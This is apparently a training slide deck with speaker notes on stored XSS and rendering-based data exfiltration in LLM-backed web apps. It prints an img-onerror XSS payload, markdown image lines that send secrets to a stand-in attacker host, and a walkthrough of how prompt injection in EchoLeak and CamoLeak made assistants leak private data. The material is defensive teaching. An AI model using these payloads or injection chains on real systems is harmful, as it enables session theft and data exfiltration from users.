## The uncomfortable framing

You are not attacking an AI. You are attacking a **web app that happens to contain an AI.**

Every OWASP Top Ten bug you already know still applies — and LLM features are a **fresh place to forget them**, because teams treat model output as "just text."

<!-- Notes: A lot of AI security discourse acts as if 2003 never happened. The most common real-world LLM vulnerability isn't some exotic alignment failure — it's XSS, SSRF, or IDOR in the app wrapped around the model. If you take one strategic point from M2, let it be this: AI security does not replace AppSec. -->

## 2025: output rendering became the exfil channel

| Incident | The mechanism |
|---|---|
| **EchoLeak** · CVE-2025-32711, CVSS **9.3** · Jun 2025 | zero-click M365 Copilot: hidden prompt in an email → Copilot exfiltrated OneDrive / SharePoint / Teams content |
| **CamoLeak** · GitHub Copilot Chat · Legit Security | hidden prompt in a PR description → private source code exfiltrated **through GitHub's own image proxy** |

Both exfiltrated data through the **rendering layer** — images and markdown, not script.

<!-- Notes: EchoLeak is credited as the first documented case of prompt injection weaponized for concrete data exfiltration in a production AI system — zero user interaction, the payload invisible as an HTML comment or white-on-white text. CamoLeak is the more instructive one for us: the exfil channel was Camo, GitHub's own security feature for proxying images. GitHub's fix was to disable image rendering in Copilot Chat entirely. The pattern: nobody needed to execute script. They just needed the app to render something that made an outbound request. -->

---

## The pattern to carry into today

**If output can cause the browser to fetch a URL, output is an exfiltration channel.**

- markdown image: `![](https://attacker/?d=SECRET)`
- HTML `<img src>` — the classic
- link previews, avatars, iframes, CSS `url()`, prefetch hints

No `<script>` required. **Rendering is enough.**

<!-- Notes: This is the intellectual core of M2, and it generalizes far beyond our lab. Most teams sanitize for script execution and forget that a passive image fetch leaks data just as effectively — the payload is in the URL, and the browser sends it obediently. So ask yourself: does your product render markdown from a model? Then you have this. -->

## Stored vs reflected — why "stored" is the nasty one

| | Reflected | **Stored** |
|---|---|---|
| Lives in | the URL / one request | the **database** |
| Delivery | victim must click your link | victim just **loads the page** |
| Blast radius | one target at a time | **everyone** who views it |

Iggy's `display_name` is persisted server-side and re-rendered on every page load. That's stored.

<!-- Notes: The one point worth dwelling on: with no bait link, there's no social-engineering step, so the attack works against support staff and admins who never clicked anything. In a real bank, the highest-value victim is the support agent viewing the customer's profile. -->

## Under the hood: the one unsafe sink

```html
<!-- templates/chat.html -->
<div id="greeting">Welcome, <span id="dn">{{ display_name_html | safe }}</span></div>
```

Jinja2 autoescapes by default. **`| safe` switches it off.**

<!-- Notes: It's one line of template. The `| safe` filter is the whole vulnerability — it tells Jinja "trust me, this is already safe HTML," and it almost never is. In a code review, `| safe`, React's dangerouslySetInnerHTML, and .innerHTML are the greppable sinks. And notice the irony of the naming: the dangerous filter is literally called "safe." -->

---

## The guard it depends on

```python
def encode_output(text, settings):
    if settings.sec_output_encoding:
        return html.escape(text)   # SECURE: <img> → &lt;img&gt;  (inert)
    return text                    # VULNERABLE: raw markup into the DOM
```

One flag, one function, one decision. **`SEC_OUTPUT_ENCODING`**

<!-- Notes: The whole module hinges on a four-line function. That's deliberate: the vulnerability is one wrong rendering decision, and the fix is one function call. Don't let it seem more complicated than that — in real codebases it genuinely is this small, and that's exactly why it keeps happening. -->

---

## The contrast that IS the lesson

Every **other** dynamic field on that page is written with `.textContent`:

```javascript
p.textContent = who + ": " + text;        // chat lines    — safe
ragout.textContent = data.reply ?? ...;   // RAG answer    — safe
m5out.textContent = text;                  // agent output  — safe
```

`textContent` treats input as **literal text** — the browser never parses it as HTML.

<!-- Notes: An important nuance, and a genuinely good design decision in the lab. The model's own output — the thing an attacker most easily controls via M1-style injection — is rendered safely everywhere. Exactly one sink is deliberately unsafe. So the XSS is an isolated, intentional surface rather than sloppiness sprayed around — which means when it fires, you know precisely why. -->

---

## …and the real-world bug is usually the opposite

Iggy escapes **model** output and forgets **user** input.

Most production apps escape **user** input carefully — and dump **model** output raw, because "it's just our own AI talking."

Then someone prompt-injects the model into emitting `<img onerror=…>`.

<!-- Notes: Our lab inverts reality here for teaching clarity. The chain that actually bites people in production is M1 into M2: inject the model, make it emit markup, and let your own trusted rendering path execute it. EchoLeak and CamoLeak are both that chain. Our lab renders model output via textContent specifically so you see the safe pattern — but the dangerous version is the common one in the wild. -->

---

## The payload

```html
<img src=x onerror="new Image().src='/beacon/xss?session=<id>'">
```

Set it as your **display name** — via the profile field on `/chat`, or `POST /api/profile`.

<!-- Notes: Here are the mechanics: src=x is a deliberately broken image URL, the load fails, onerror fires, and the handler makes an outbound request carrying the session id. In a real attack, that URL is attacker-controlled and the query string carries cookies, tokens, or page content. -->

---

## Why `<img onerror>` and not `<script>`

An injected `<script>` tag added to the DOM **after page load often will not execute.**

An `<img>`'s `onerror` handler **always** runs when the (bogus) image fails.

No click, no user interaction. The classic reliable auto-firing primitive.

<!-- Notes: This is the practical detail people get wrong. If you try `<script>alert(1)</script>` first and nothing happens, you'll assume the lab is broken. It isn't — innerHTML-inserted script doesn't run, per the HTML spec, but event handlers on injected elements do. Other reliable primitives: `<svg onload>`, `<body onload>`, `<iframe srcdoc>`. -->

## Break it: stored XSS → beacon

1. Set `display_name` to the payload
2. Load `GET /chat?session=<id>` **in a real browser**
3. `/beacon/xss` records `xss_beacon` → **core pass**

**You must use a browser.** `curl` will not execute `onerror`.

<!-- Notes: Before you start, here's the failure mode. When your beacon doesn't fire, it's almost always one of two things: you POSTed the profile but never loaded the page in a browser, or you're on a different session id than the one in your payload. Check the browser devtools Network tab for the /beacon/xss request — that's your proof, and it's the habit of verifying exploitation rather than assuming it. -->

---

## Honesty about the grader

The beacon is a **teaching instrument**, not an anti-cheat system.

You could `curl /beacon/xss?session=<id>` and it would mark you passed — and you'd have proved **nothing about XSS**, only that the endpoint is wired.

**The browser is the exercise.** Skip it and you skipped the module.

<!-- Notes: I'll just say this out loud, because you'll notice it anyway: a bare curl will flip m2 core. That's a deliberate choice, not an oversight — hardening the beacon against forgery would add real complexity to a demo-only path, and nobody's grading a certification here. It's an honor system with an obvious point: the only person you'd be cheating is yourself. So make the Network tab show the /beacon/xss request — that's your real proof. -->

## Why prompt disclosure matters more than it looks

A leaked system prompt is **reconnaissance**:

- the exact wording to override
- tool names and schemas → what the agent can *do*
- secrets careless teams left inline
- canaries and marker formats

Leak the prompt, and every later attack gets **cheaper and more precise**.

<!-- Notes: You might shrug at prompt disclosure — "so what, it's just instructions." Reframe it as reconnaissance. Once you know the tool schema, you know the attack surface for M5 and M6; once you know the policy wording, you know exactly what to override. That's why the canary exists, and why prompt disclosure is LLM02 rather than a curiosity. -->

## Secure it: two independent guards

Flip `SEC_OUTPUT_ENCODING` and reload the **same** payload.

1. **Output encoding** — `html.escape` runs *before* the template, so `| safe` is now escaping inert entities
2. **Content-Security-Policy** — secure mode ships a CSP with no `unsafe-inline`

**Either one alone stops it.** That is the point of layering.

<!-- Notes: This is the cleanest defense-in-depth demo in the course, because you can remove either guard and still be safe. So which one saved us? Either one, alone. And note that in vulnerable mode there's no CSP header at all — so the payload executes freely. -->

---

## Prove it two ways

```bash
curl -i '/chat?session=<id>' | grep -i content-security-policy
#   → Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-…'
```

Then **view-source** and read the escaped entities:

```html
<span id="dn">&lt;img src=x onerror=…&gt;</span>
```

`core: fail`

<!-- Notes: Two artifacts here. The header proves the second guard; view-source proves the first. Look at the actual escaped entity string — seeing `&lt;img&gt;` sitting inertly in the DOM is what makes escaping finally click if you've only ever heard about it. -->

## Now break the fix

Encoding and CSP are strong. So attack **elsewhere**:

- a **different sink** — does any other field render raw? PDF export? email template? admin view?
- **CSP gaps** — `unsafe-inline`, over-broad `img-src`, a JSONP endpoint on an allowed host
- **markdown rendering** — if any surface renders model markdown, `![](https://attacker/?d=…)` needs no script at all
- **non-HTML sinks** — CSV injection into an exported report

<!-- Notes: The markdown route is the one to dwell on, because it's how EchoLeak and CamoLeak actually worked, and it defeats a script-focused CSP entirely — img-src almost always allows external hosts. Inventory every place your product renders model output: chat, email digests, PDF reports, Slack notifications, admin dashboards. One raw sink is all it takes. -->

---

## What actually holds

| Defence | Strength |
|---|---|
| **Context-aware output encoding** | **strong** — the actual fix |
| **CSP** (no `unsafe-inline`, tight `img-src`) | **strong** — second layer, also limits exfil |
| `textContent` / safe-by-default templating | **strong** — makes the safe path the easy path |
| Blocklisting `<script>` | weak — dozens of primitives, no script needed |
| "The model won't emit HTML" | none — that's what injection is for |

<!-- Notes: Here's the scorecard. Note the pattern that repeats in every module: structural defenses hold, semantic ones leak. Encoding and CSP are structural. Blocklists are semantic. And the last row is the specific failure of AI-era teams — they reason about what the model is likely to say, rather than what it can be made to say. -->

## The lesson to name

# Model output is untrusted input.

The model is not your developer. Its output is attacker-influenceable data — **encode it at every sink, and never let it reach a raw HTML path.**

<!-- Notes: If you remember one sentence from M2, make it the heading on this slide. It's the same shape as M1's lesson and M6's: something the system treats as trusted is actually attacker-controlled. Here, it's the model's own words. -->

## Take this back to work on Monday

- Grep for the sinks: `| safe`, `dangerouslySetInnerHTML`, `.innerHTML`, `v-html`, `mark_safe`
- **Inventory every surface that renders model output** — chat, email, PDF, Slack, admin
- Ship a CSP with no `unsafe-inline`; tighten `img-src` (it's an exfil channel)
- If you render markdown from a model, **restrict image sources** — or don't render images
- Add prompt disclosure to your test suite; put a canary in your system prompt

<!-- Notes: These are five concrete actions. The markdown and img-src one is the item most teams have never considered — and it's exactly what GitHub ended up doing to fix CamoLeak: they disabled image rendering outright. The canary suggestion is cheap, and it gives you detection for free. -->
